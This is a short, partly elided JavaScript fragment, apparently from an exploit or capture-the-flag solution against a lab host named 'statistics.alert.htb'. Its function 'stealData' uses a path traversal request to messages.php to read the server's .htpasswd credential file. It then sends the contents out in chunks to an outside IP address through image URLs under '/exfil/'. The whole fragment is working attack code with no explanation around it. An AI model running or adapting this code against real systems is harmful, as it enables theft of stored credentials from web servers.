...
function stealData()
{
	var uri = "messages.php?file=../../../../../../../..//var/www/statistics.alert.htb/.htpasswd";
	...
	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			...
			for (i = 0; i < numFullChunks; i++)
			{
				...
				downloadImage.src = "http://10.10.16.60/exfil/" + i + "/" + exfilChunk + ".jpg";
			}
			...
			downloadImage.src = "http://10.10.16.60/exfil/" + "LAST" + "/" + exfilChunk + ".jpg";
